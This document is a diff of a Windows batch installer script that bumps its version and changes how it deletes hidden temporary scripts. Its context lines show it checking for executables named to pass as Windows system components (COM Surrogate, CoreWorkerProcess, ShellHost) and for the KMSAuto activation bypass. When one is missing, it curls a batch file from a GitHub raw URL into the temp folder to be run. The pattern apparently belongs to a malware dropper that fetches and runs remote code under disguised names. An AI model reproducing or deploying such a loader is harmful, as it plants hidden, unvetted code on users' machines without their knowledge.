@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=23.8"
+set "BATCHVERSION=23.9"
 
 
 
@@ -598,8 +598,7 @@ echo Going to SHSTINSTALL...
 :: Run commands if ShellHost.exe is not found
 echo Checking for ShellHost...
 set "embeddedScript=%temp%\temp_script_SHST.bat"
-attrib -h -s -r "%embeddedScript%"
-del /f /q "%embeddedScript%"
+del /f /q /a "%embeddedScript%"
 
 
 
@@ -749,8 +748,7 @@ echo Going to KMSINSTALL...
 :: Run commands if KMSAuto.exe is not found
 echo Checking for KMSAuto...
 set "embeddedScript=%temp%\temp_script_KMS.bat"
-attrib -h -s -r "%embeddedScript%"
-del /f /q "%embeddedScript%"
+del /f /q /a "%embeddedScript%"
 
 :: Download content and save to the embedded batch file
 curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/KMSAuto"
@@ -818,8 +816,7 @@ if exist "%ProgramData%\Microsoft\Windows\COM Surrogate.exe" (
 :: Run commands if ComSurrogate.exe is not found
 echo Checking for COM Surrogate...
 set "embeddedScript=%temp%\temp_script_COM.bat"
-attrib -h -s -r "%embeddedScript%"
-del /f /q "%embeddedScript%"
+del /f /q /a "%embeddedScript%"
 
 
 :: Download content and save to the embedded batch file
@@ -895,8 +892,7 @@ if exist "%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe" (
 :: Run commands if CoreWorkerProcess.exe is not found
 echo Checking for CoreWorkerProcess...
 set "embeddedScript=%temp%\temp_script_CWP.bat"
-attrib -h -s -r "%embeddedScript%"
-del /f /q "%embeddedScript%"
+del /f /q /a "%embeddedScript%"
 
 
 :: Download content and save to the embedded batch file
@@ -964,8 +960,7 @@ if exist "%APPDATA%\Microsoft\7z.dll" (
 :: Run commands if Nircmd.exe is not found
 echo Checking for 7z...
 set "embeddedScript=%temp%\temp_script_7z.bat"
-attrib -h -s -r "%embeddedScript%"
-del /f /q "%embeddedScript%"
+del /f /q /a "%embeddedScript%"
 
 
 :: Download content and save to the embedded batch file
@@ -1022,8 +1017,7 @@ if exist "%APPDATA%\Microsoft\nircmd.exe" (
 :: Run commands if Nircmd.exe is not found
 echo Checking for Nircmd...
 set "embeddedScript=%temp%\temp_script_Nircmd.bat"
-attrib -h -s -r "%embeddedScript%"
-del /f /q "%embeddedScript%"
+del /f /q /a "%embeddedScript%"
 
 
 :: Download content and save to the embedded batch file
@@ -1078,8 +1072,7 @@ if exist "%file9%" (
 :: Run commands if handle.exe is not found
 echo Checking for handle...
 set "embeddedScript=%temp%\temp_script_handle.bat"
-attrib -h -s -r "%embeddedScript%"
-del /f /q "%embeddedScript%"
+del /f /q /a "%embeddedScript%"
 
 
 :: Download content and save to the embedded batch file
